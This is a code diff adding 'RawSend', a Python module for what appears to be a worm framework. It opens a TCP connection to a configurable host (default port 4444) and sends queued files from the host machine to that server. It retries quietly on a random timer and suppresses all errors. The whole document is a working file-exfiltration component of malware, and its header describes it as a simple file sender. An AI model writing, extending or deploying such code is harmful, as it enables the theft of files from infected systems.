@@ -1,0 +1,100 @@
+#!name##RawSend
+#!types##module
+#!info##[PyS] A simple Python module that uses a TCP socket to transfer files. Its sole purpose is to send files to a server. It does not receive commands or messages.
+#!reqVar##RAWS_ip##Host address.##str
+#!setVar##RAWS_ip##0.0.0.0##str
+#!reqVar##RAWS_port##Host port number##int
+#!setVar##RAWS_port##4444##int
+#!reqVar##RAWS_format##Message encoding format.##str
+#!setVar##RAWS_format##utf-8##str
+#!TAGS##[PyS]
+
+import socket
+import threading
+from time import sleep
+from typing import Union
+from random import randint
+
+
+class RawSend:
+    MTYPES = "conn"
+    def __init__(self, worm: object):
+        self.worm = worm
+        self.addr = ("{{RAWS_ip}}", {{RAWS_port}})
+        self.format = "{{RAWS_format}}"
+        self.is_conn = False
+        self._try_conn = False
+        self._conn_th = None
+        self.too_send = set()
+        self.lock = threading.Lock()
+
+    def _connect(self) -> bool:
+        self.is_conn = False
+        self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        try:
+            self.client.connect(self.addr)
+            self.is_conn = True
+            return True
+        except:
+            return False
+
+    def _conn(self) -> None:
+        while self.worm.working:
+            if self._connect():
+                self.client.settimeout(3)
+                self._send_files()
+                self._recive()
+            sleep(randint(2, 6))
+    
+    def connect(self) -> None:
+        if not self._try_conn:
+            self._try_conn = True
+            self._conn_th = threading.Thread(target=self._conn, daemon=True)
+            self._conn_th.start()
+    
+    def _recive(self) -> None:
+        while self.worm.working:
+            try:
+                recv = self.client.recv(16)
+            except TimeoutError:
+                continue
+            except:
+                break
+            if not recv:
+                break
+        try:
+            self.client.close()
+        except:
+            pass
+        self.is_conn = False
+
+    def send_msg(self, msg: str) -> None:
+        pass
+    
+    def send_data(self, data: str) -> None:
+        pass
+
+    def send_file(self, fpath: str, *args, **kwargs) -> bool:
+        if not self.is_conn:
+            self.too_send.add(fpath)
+            return False
+        else:
+            try:
+                with open(fpath, "rb") as file:
+                    self.client.sendfile(file, 0)
+            except:
+                pass
+        return True  
+    
+    def _send_files(self) -> None:
+        ts = []
+        with self.lock:
+            ts = list(self.too_send)
+            self.too_send = set()
+        for fs in ts:
+            self.send_file(fs)
+
+    def start(self) -> None:
+        self.connect()
+    
+
